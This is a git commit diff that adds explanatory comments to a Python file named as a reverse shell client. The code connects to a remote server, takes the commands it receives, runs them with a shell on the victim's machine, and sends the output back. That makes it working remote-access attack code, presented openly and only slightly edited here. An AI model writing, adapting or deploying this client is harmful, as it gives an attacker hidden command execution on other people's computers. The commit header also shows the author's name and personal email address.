9b038053ed629be4bc8936d3b91df4e787d9ad94
Pratyush-Remon <karmasama123456@gmail.com>
2022-08-14 11:56:55 +0530

    yet another commit

--- Reverse shell/Client/client.py
+++ Reverse shell/Client/client.py
@@ -5,21 +5,21 @@ from sys import stdout
 
 
 s=socket.socket()
-host='192.168.29.237'
+host='ip'        #replace ip with the server pc's ip address
 port= 7895
 
 s.connect((host,port))
 
 
 while True:
-    data=s.recv(1024)
+    data=s.recv(1024)                      #this is to recive data
     if data[:2].decode('utf-8')=='cd':
         os.chdir(data[3:].decode('utf-8'))
     
     if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) #this allow you to use cmd prompt in clients PC
         output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
+        output_str = str(output_byte,"utf-8")        #this is to collect and send data to server pc
         currentWD = os.getcwd() + "> "
         s.send(str.encode(output_str + currentWD))
         
